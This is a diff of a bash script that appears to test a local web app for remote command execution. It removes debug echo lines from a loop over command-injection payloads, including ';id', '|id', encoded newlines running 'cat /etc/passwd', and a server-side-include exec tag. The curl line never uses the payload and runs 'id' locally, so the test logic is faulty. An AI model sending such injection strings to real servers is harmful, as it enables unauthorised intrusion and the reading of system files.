@@ -9,14 +9,11 @@ root_uri="http://localhost:3000/app/"
 # Some payloads to test the RCE vulnerability
 
 payloads=(";id" "|id" "a);id" "%0Acat%20/etc/passwd" "%0A/usr/bin/id" "%0Aid" "%0A/usr/bin/id%0A" "%0Aid%0A" "&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;")
-echo "hola"
 # Iterate through the payloads
 for payload in "${payloads[@]}"
 do
-    echo $payload
     # Send the payload to the server
     response=$(curl -s -o /dev/null 'http://localhost:3000/app/something';id)
-    echo $response
     if [[ $response == *"uid"* ]]; then
         
         echo "RCE vulnerability exists"
